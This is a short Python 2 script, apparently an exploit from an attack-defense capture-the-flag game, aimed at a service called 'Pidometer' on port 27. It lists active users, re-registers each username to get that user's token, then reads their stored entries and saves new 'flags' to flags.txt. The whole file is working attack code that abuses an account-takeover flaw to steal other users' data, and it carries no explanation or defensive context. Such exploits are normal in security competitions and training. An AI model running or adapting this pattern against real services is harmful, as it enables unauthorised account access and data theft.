# coding=utf-8
__author__ = 'm_messiah'

import socket
from sys import argv

sock = socket.socket()
sock.connect((argv[1] if len(argv) > 1 else "localhost", 27))
data = sock.recv(1024)
if "Pidometer" not in data:
    print data
    exit(1)

sock.send("activity 50\r\n")
data = sock.recv(10240)
oldflags = map(lambda i: i.strip(), open("flags.txt", "r").readlines())
for line in data.split("\n")[2:-1]:
    line = line.split()
    if len(line) < 2:
        continue
    user = line[0]
    sock.send("register " + user + "\r\n")
    token = sock.recv(255).split()
    if len(token) < 2:
        continue
    token = token[1]
    sock.send("view " + token + " 50\r\n")
    flags = sock.recv(1024).split("\n")
    if len(flags) < 2:
        continue

    for flag in flags[1:-1]:
        flag = flag.split()
        if len(flag) < 2:
            continue
        flag = flag[1]
        if flag not in oldflags:
            oldflags.append(flag)
            with open("flags.txt", "a") as w:
                w.write(flag + "\n")
            print flag


sock.close()